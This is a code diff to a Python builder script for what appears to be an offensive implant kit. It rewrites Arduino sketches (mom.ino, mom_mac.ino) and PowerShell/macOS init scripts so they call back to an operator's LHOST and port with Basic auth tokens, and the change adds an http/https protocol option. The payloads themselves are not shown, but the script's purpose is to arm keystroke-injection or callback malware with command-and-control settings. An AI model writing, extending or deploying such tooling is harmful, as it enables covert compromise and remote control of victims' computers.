@@ -216,18 +216,19 @@ def patch_init_ps1(lhost, port, mods_token):
         f.write(content)
     print(f"[+] init.ps1     patched  H={lhost}  P={port}  AU=Basic {mods_token[:10]}...")
 
-def patch_ino(filename, lhost, port, init_token):
+def patch_ino(filename, lhost, port, init_token, proto):
     path = os.path.join(BASE_DIR, filename)
     if not os.path.exists(path):
         print(f"[!] {filename} not found, skipping patch"); return
     with open(path, "r", encoding="utf-8") as f:
         content = f.read()
-    content = re.sub(r'#define LHOST\s+"[^"]*"',     f'#define LHOST     "{lhost}"',           content)
-    content = re.sub(r'#define HTTP_PORT\s+"[^"]*"',  f'#define HTTP_PORT "{port}"',             content)
-    content = re.sub(r'#define AUTH\s+"Basic [^"]*"', f'#define AUTH      "Basic {init_token}"', content)
+    content = re.sub(r'#define LHOST\s+"[^"]*"[^\n]*',     f'#define LHOST     "{lhost}"',           content)
+    content = re.sub(r'#define HTTP_PORT\s+"[^"]*"[^\n]*',  f'#define HTTP_PORT "{port}"',             content)
+    content = re.sub(r'#define PROTO\s+"[^"]*"[^\n]*',      f'#define PROTO     "{proto}"',            content)
+    content = re.sub(r'#define AUTH\s+"Basic [^"]*"[^\n]*', f'#define AUTH      "Basic {init_token}"', content)
     with open(path, "w", encoding="utf-8") as f:
         f.write(content)
-    print(f"[+] {filename:<16} patched  LHOST={lhost}  HTTP_PORT={port}")
+    print(f"[+] {filename:<16} patched  LHOST={lhost}  HTTP_PORT={port}  PROTO={proto}")
 
 def patch_init_mac(lhost, port, mods_token):
     path = os.path.join(MODULS_DIR, "init_mac.sh")
@@ -266,10 +267,11 @@ if __name__ == "__main__":
     os.makedirs(OUTPUTS_DIR, exist_ok=True)
 
     lhost = args.lhost or args.host
+    proto = "https" if args.cert else "http"
     patch_init_ps1(lhost, str(args.port), EXPECTED_MODS)
     patch_init_mac(lhost, str(args.port), EXPECTED_MODS)
-    patch_ino("mom.ino",     lhost, str(args.port), EXPECTED_INIT)
-    patch_ino("mom_mac.ino", lhost, str(args.port), EXPECTED_INIT)
+    patch_ino("mom.ino",     lhost, str(args.port), EXPECTED_INIT, proto)
+    patch_ino("mom_mac.ino", lhost, str(args.port), EXPECTED_INIT, proto)
 
     same_auth = EXPECTED_INIT == EXPECTED_MODS
     proto     = "https" if args.cert else "http"
